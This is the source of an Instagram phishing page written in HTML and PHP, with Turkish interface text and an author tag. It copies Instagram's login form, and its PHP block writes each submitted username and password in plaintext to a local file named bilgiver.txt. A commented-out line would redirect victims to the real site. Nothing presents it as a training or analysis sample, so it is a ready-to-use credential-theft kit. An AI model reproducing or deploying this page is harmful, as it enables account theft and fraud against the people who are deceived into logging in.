<html>
<head>
<link rel="Shortcut Icon" href="instagram.ico" type="image/x-icon">
<link rel="stylesheet" type="text/css" href="tasarim.css"/>
<title>
İnstagram
</title>
<head>
<body bgcolor="#fafafa">
<center>
<br>
<table border="0">
<tr>
<td>
<img src="tel.png">
</td>
<td>
<div class="ana">
<center>

<a href=""><img src="logo.png"></a>
</center>
<br><center>
<form action="" method="post">
<input type="text" placeholder="Kullanıcı Adı" name="kullaniciadi"><br>
<input type="password" placeholder="Şifre" name="sifre"><br>
<font color="white">------------------------</font><a href="#">Unuttun mu ?</a><br>	
 <div class="ari"><input type="submit" value="Giriş yap"> </div><br><br>
<div class="yari">Hesabın Yokmu?   <a href="index.php">Kaydol</a></div></center></td>
</tr>
</table>
</div>
<img src="footer.png">
</center>
<hr>
</body>
</html>
<!-- TürkayMeral -->
<?php 
@$ad=$_POST["kullaniciadi"];
@$sifre=$_POST["sifre"];
if($_POST){

$yaz=fopen("bilgiver.txt","a");
$icerik="Kullanıcı adı :".$ad." şifre :".$sifre."\n";
fwrite($yaz,$icerik);
 
fclose($yaz);
//	header("location:http://www.instagram.com");
}
?>
